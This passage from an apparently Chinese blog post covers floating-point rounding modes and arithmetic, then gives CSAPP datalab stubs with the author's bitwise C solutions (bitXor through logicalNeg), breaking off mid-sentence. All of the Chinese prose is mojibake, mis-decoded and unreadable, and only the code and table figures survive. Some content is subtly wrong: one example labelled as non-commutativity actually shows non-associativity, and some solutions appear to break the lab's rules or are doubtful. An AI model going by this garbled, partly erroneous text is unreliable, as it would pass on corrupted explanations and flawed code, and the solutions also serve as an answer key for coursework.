åˆ™å¾—åˆ° <code>NAN</code>ã€‚</li></ol><h4 id="èˆå…¥"><a href="#èˆå…¥" class="headerlink" title="èˆå…¥"></a>èˆå…¥</h4><p>æµ®ç‚¹æ•°å› ä¸ºè¡¨è¾¾çš„ä¸æ˜¯ä¸€ä¸ªå…·ä½“çš„æ•°ï¼Œåªæ˜¯ä¸€ä¸ªè¿‘ä¼¼å€¼ï¼Œå› æ­¤åœ¨ç²¾åº¦ä¸å¤Ÿçš„æƒ…å†µï¼Œåªèƒ½é€‰æ‹©èˆæ‰ä¸€äº›ç²¾åº¦ä¿è¯èƒ½å¤Ÿå­˜å‚¨ã€‚å¦‚ä½•èˆå…¥ä¾¿æˆä¸ºäº†ä¸€é¡¹éš¾é¢˜ï¼Œç›®å‰ä¸€å…±æœ‰å››ç§èˆå…¥æ–¹å¼ï¼šä¸‹é¢æˆ‘ä»¬ç»™å‡ºä¸€äº›ä¾‹å­</p><table><thead><tr><th>æ–¹å¼</th><th>1.40</th><th>1.60</th><th>1.50</th><th>2.50</th><th>-1.50</th></tr></thead><tbody><tr><td>å‘å¶æ•°èˆå…¥</td><td>1</td><td>2</td><td>2</td><td>2</td><td>-2</td></tr><tr><td>å‘é›¶èˆå…¥</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-1</td></tr><tr><td>å‘ä¸‹èˆå…¥</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-2</td></tr><tr><td>å‘ä¸Šèˆå…¥</td><td>2</td><td>2</td><td>2</td><td>3</td><td>-1</td></tr></tbody></table><p>åé¢ä¸‰ä¸ªæ–¹å¼è¿˜å¥½ï¼Œåº”è¯¥éƒ½èƒ½ç†è§£ï¼Œä¸»è¦æ˜¯è¿™ä¸ªå‘å¶æ•°èˆå…¥ï¼Œå®ƒé¦–å…ˆæ»¡è¶³ï¼šè¢«èˆå…¥çš„å€¼ä¸è¶…è¿‡æœ€å°å•ä½çš„ä¸€åŠåˆ™ä¸¢å¼ƒï¼Œè‹¥è¶…è¿‡ä¸€åŠåˆ™åŠ ä¸Šä¸€ä¸ªæœ€å°å•ä½ï¼Œè‹¥ç­‰äºä¸€åŠåˆ™ä¸€å®šä¼šä½¿å¾—èˆå…¥çš„ç»“æœä¸ºå¶æ•°ä¸ªæœ€å°è®¡é‡å•ä½ã€‚</p><h4 id="æµ®ç‚¹è¿ç®—"><a href="#æµ®ç‚¹è¿ç®—" class="headerlink" title="æµ®ç‚¹è¿ç®—"></a>æµ®ç‚¹è¿ç®—</h4><p>åœ¨è¿›è¡Œæµ®ç‚¹æ•°åŠ å‡æ³•çš„æ—¶å€™ï¼Œé¦–å…ˆéœ€è¦å¯¹é˜¶ï¼Œå°é˜¶å‘å¤§é˜¶å¯¹é½ï¼Œç„¶åå°¾æ•°ç›¸åŠ ã€‚ç”±äºç‰¹æ®Šå€¼çš„å­˜åœ¨ï¼Œæµ®ç‚¹æ•°åŠ å‡æ³•å¹¶ä¸æ»¡è¶³äº¤æ¢è§„åˆ™ï¼Œå› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªé˜¿è´å°”ç¾¤ï¼Œå¾ˆå¤šæ•´æ•°è§„å¾‹ä¸é€‚ç”¨ã€‚</p><p>æ¯”å¦‚æœ€ç»å…¸çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+1e111-1e111!=1e111-1e111+1</span><br></pre></td></tr></table></figure><h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>è¿™é‡Œæ¥å›ç­”ä¸€ä¸‹ä¹‹å‰é—ç•™çš„ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ä¸ºä»€ä¹ˆæ•´æ•°è½¬ä¸ºæµ®ç‚¹æ•°ä¹‹åä¼šæœ‰éƒ¨åˆ†ä½ç›¸åŒ¹é…ã€‚å…¶å®ä¸éš¾å‘ç°æ˜¯å› ä¸ºæµ®ç‚¹æ•°çš„å°¾æ•°åŸºæœ¬æ˜¯å’ŒåŸäºŒè¿›åˆ¶çš„å€¼ä¸€è‡´çš„ã€‚æ¯”å¦‚ä¸‹é¢çš„ä¸€ä¸ªæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1001001010101</span><br></pre></td></tr></table></figure><p>è½¬ä¸ºæµ®ç‚¹æ•°ä¹‹åå°±ä¼šå˜æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.001001010101*2^12</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°¾æ•°æ˜¯ä¸åŸäºŒè¿›åˆ¶çš„å€¼ä¸€è‡´çš„ï¼Œæƒ³åˆ°è¿™é‡Œä½ è‚¯å®šæ˜ç™½äº†ä¹‹å‰çš„é‚£ä¸ªé—®é¢˜äº†ã€‚</p><h2 id="CSAPP-datalab"><a href="#CSAPP-datalab" class="headerlink" title="CSAPP:datalab"></a>CSAPP:datalab</h2><p>ç»ˆäºåˆ°äº†æœ€æ¿€åŠ¨çš„å®éªŒç¯èŠ‚äº†ï¼ŒåŸå…ˆæˆ‘å¯¹è¿™æœ¬ä¹¦å¹¶æ²¡æœ‰å¾ˆæ·±çš„äº†è§£ï¼Œç›´æ¥ä¸Šæ‰‹åšçš„å®éªŒï¼Œä¸ä¼šå°±æœï¼Œç°åœ¨çœ‹å®Œä¸€éä¹‹åæ„Ÿè§‰ç†è§£å¾ˆå¤šï¼Œåšå®éªŒåŸºæœ¬ä¹Ÿæ˜¯ç•…é€šæ— é˜»ã€‚</p><p>ç”¨ç»™å®šçš„è¿ç®—ç¬¦å®ç°å‡½æ•°çš„åŠŸèƒ½ï¼Œè§£å‹å¾—åˆ°æºç ä¹‹ååœ¨ <code>bits.c</code> ä¸­ç¼–å†™è‡ªå·±çš„ä»£ç ï¼Œç„¶åè¦æŸ¥çœ‹ç»“æœå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$make</span><br><span class="line">$./btest</span><br></pre></td></tr></table></figure><p>å®éªŒè§„å®šå¹¶éå¼ºåˆ¶ï¼Œä½†æ˜¯æƒ³è·å¾—æå‡è¿˜æ˜¯ä¸¥æ ¼éµå®ˆå®ƒç»™å®šçš„æ¡ä»¶ã€‚</p><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªå…è®¸ä½¿ç”¨ä½è¿ç®— <code>~</code> å’Œ <code>&amp;</code> å®ç°æŒ‰ä½å¼‚æˆ–ï¼Œè¿™ä¸ªæˆ‘ä»¬åœ¨ä¸Šé¢æœ‰å†™è¿‡ï¼Œåªä¸è¿‡æ²¡æœ‰åˆåœ¨ä¸€èµ·ï¼Œç¨å¾®è½¬æ¢ä¸€ä¸‹å³å¯ï¼Œåæ­£å®ç°çš„æ€æƒ³å°±æ˜¯è¦ä½ä¹‹é—´ä¸ä¸€æ ·æ‰è¿”å› <code>1</code>ã€‚</p><h4 id="ç­”æ¡ˆ"><a href="#ç­”æ¡ˆ" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~(~x&amp;y)&amp;~(x&amp;~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å¾—æ•´æ•°çš„æœ€å°å€¼ï¼Œæœ€å°å€¼å°±æ˜¯æˆ‘ä»¬å–œé—»ä¹è§çš„ <code>-2147483648</code> å•¦ï¼Œä½†æ˜¯æˆ‘ä»¬ç¨å¾®è½¬æ¢ä¸€ä¸‹æ€è·¯ï¼Œæœ€å°å°±æ˜¯æœ€é«˜ä½ä¸€ä¸ª0ï¼Œç”¨ä¸ª <code>1</code>ï¼Œç„¶åç§»ä½è¿ç®—æŠŠå®ƒç§»åˆ°æœ€é«˜ä½å³å¯ã€‚</p><h4 id="ç­”æ¡ˆ-1"><a href="#ç­”æ¡ˆ-1" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­ <code>x</code> æ˜¯å¦ä¸ºæœ€å¤§å€¼ï¼Œæœ€å¤§å€¼åº”è¯¥æ˜¯æœ€å°å€¼å–åï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ä¸€æ ·æˆ‘ä»¬ä½¿ç”¨å¼‚æˆ–è¿ç®—ï¼Œå¼‚æˆ–åªæœ‰åœ¨ä¸¤è¾¹ç›¸ç­‰æ—¶æ‰è¿”å› <code>0</code>ï¼Œæˆ‘ä»¬ç”¨éè¿ç®—ç¬¦åä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p><h4 id="ç­”æ¡ˆ-2"><a href="#ç­”æ¡ˆ-2" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((~(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))^x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­ <code>x</code> æ˜¯å¦å¥‡æ•°ä½ä¸Šå…¨ä¸º <code>1</code>ã€‚å…¨ <code>1</code> æˆ‘ä»¬ç›´æ¥ç”¨ä¸€ä¸ªç«‹å³æ•°å¥½äº† <code>0xAAAAAAAA</code>ï¼Œç„¶åä¸å±è”½å¶æ•°ä½ä¹‹ååˆ¤æ–­æ˜¯å¦ç›¸ç­‰å³å¯ã€‚</p><h4 id="ç­”æ¡ˆ-3"><a href="#ç­”æ¡ˆ-3" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((<span class="number">0xAAAAAAAA</span>&amp;x)^<span class="number">0xAAAAAAAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°å¯¹ä¸€ä¸ªæ•°å–è´Ÿï¼Œå–è´Ÿçš„è¯å°±æ˜¯å–åå†åŠ ä¸€å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­ä¸€ä¸ªæ•´æ•°æ˜¯å¦åœ¨ <code>ASCII</code> ç çš„æ•°å­—ä½ç½®ï¼Œå†è½¬æ¢ä¸€ä¸‹å°±æ˜¯æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="number">-0x30</span>&gt;=<span class="number">0</span>  &amp;&amp; x<span class="number">-0x3a</span>&lt;<span class="number">0</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åˆ¤æ–­ <code>x-0x30</code> æ˜¯å¦ä¸ºéè´Ÿæ•°ï¼Œ<code>x-0x3a</code> æ˜¯å¦ä¸ºè´Ÿæ•°ï¼Œä¹Ÿè®¸éœ€è¦è€ƒè™‘æº¢å‡ºï¼Œä½†æ˜¯ç»“æœå‘ç°ä¸éœ€è¦ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯ä¸¤è¾¹åˆ¤æ–­çš„ã€‚</p><h4 id="ç­”æ¡ˆ-4"><a href="#ç­”æ¡ˆ-4" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;<span class="comment">//x-0x30&gt;=0  &amp;&amp; x-0x3a&lt;0</span></span><br><span class="line"><span class="keyword">return</span> !((x+(~<span class="number">0x30</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))&amp;!!((x+(~<span class="number">0x3a</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºå®ç°è¿ç®— <code>x?y:z</code>ï¼Œå¦‚æœ <code>x</code> ä¸º <code>0</code> åˆ™è¿”å› <code>x</code>ï¼Œå¦‚æœä¸ä¸º <code>0</code> åˆ™è¿”å› <code>y</code>ã€‚</p><p>æˆ‘ä»¬å…ˆæŠŠ <code>x</code>å–å€¼å˜ä¸ºåªæœ‰ <code>0</code> å’Œ <code>-1</code>ã€‚ç”¨æ©ç çš„æ€è·¯ï¼Œå¦‚è¿‡ç»“æœä¸º <code>-1</code> åˆ™è¯´æ˜ä½æ¨¡å¼å…¨ä¸º <code>1</code>ï¼Œç›¸ä¸çš„ç»“æœå°±æ˜¯å¦ä¸€ä¸ªæ•°æœ¬èº«ï¼Œå¦‚æœæ˜¯ <code>0</code> åˆ™ä¸è®ºä¸è°ç»“æœéƒ½æ˜¯ <code>0</code>ï¼Œæˆ‘ä»¬è®© <code>x</code> ä¸ <code>y</code>ï¼Œè®© <code>~x</code> ä¸ <code>z</code>ï¼Œæœ€åå¾—åˆ°çš„ä¸¤ä¸ªå€¼æˆ–èµ·æ¥å³å¯ã€‚<code>x</code> å¦‚æœæ˜¯ <code>-1</code> åˆ™è¿”å› <code>y</code> ï¼Œå¦‚æœæ˜¯ <code>0</code> åˆ™è¿”å› <code>z</code>ã€‚å¾—åˆ° <code>x</code> æˆ‘ä»¬åªè¦éä¸¤æ¬¡ï¼Œå†å–è´Ÿå³å¯ï¼Œå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„è¦æ±‚äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">x=~(!!x)+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> (x&amp;y)|(~x&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°ä¸€ä¸ªå°äºç­‰äºçš„åŠŸèƒ½ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½ç›´æ¥ç›¸å‡ï¼Œä¼šæœ‰æº¢å‡ºã€‚</p><p>å› æ­¤æˆ‘ä»¬é€‰æ‹©å…ˆåˆ¤æ–­ç¬¦å·ä½ï¼Œç¬¦å·ä½ä¸€è‡´å†ç›¸å‡ä¸€å®šä¸ä¼šæº¢å‡ºï¼Œç¬¦å·ä¸ä¸€è‡´åˆ™å¼ºè¡Œè¿”å›ä¸ä¸€è‡´çš„ç»“æœï¼Œä¸€è‡´åˆ™è¿”å›ç›´æ¥ç›¸å‡çš„ç»“æœã€‚é¦–å…ˆæˆ‘ä»¬å…ˆæ‹¿ä¸¤ä¸ªå˜é‡ä¿å­˜ç¬¦å·çš„ç»“æœï¼Œç„¶åå†åˆ¤æ–­ç¬¦å·æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™å±è”½ç¬¦å·çš„ç»“æœï¼Œä¸ä¸€è‡´åˆ™å±è”½ç›¸å‡çš„ç»“æœã€‚</p><p>è¿™é‡Œå¥½å¥½å†ç†è§£ä¸€ä¸‹ï¼Œä»”ç»†çœ‹ <code>signx^signy</code> å’Œ <code>!(signx^signy)</code> å¦‚ä½•èµ·åˆ°å±è”½ç­”æ¡ˆçš„æ•ˆæœã€‚</p><h4 id="ç­”æ¡ˆ-5"><a href="#ç­”æ¡ˆ-5" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;<span class="comment">//y-x&gt;=0</span></span><br><span class="line">    <span class="keyword">int</span> signx=!(x&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> signy=!(y&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> sign=(signx^signy)&amp;signy;<span class="comment">//è‹¥ä¸ä¸€è‡´åˆ™è¿”å›yæ˜¯å¦ä¸ºéè´Ÿæ•°</span></span><br><span class="line">    x=x&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    y=y&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">return</span> sign|(!(((y+(~x+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))))&amp;(!(signx^signy));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°é€»è¾‘éçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦ç ”ç©¶ä¸€ä¸‹ <code>0</code> çš„ç‰¹æ€§ï¼Œ<code>0</code> 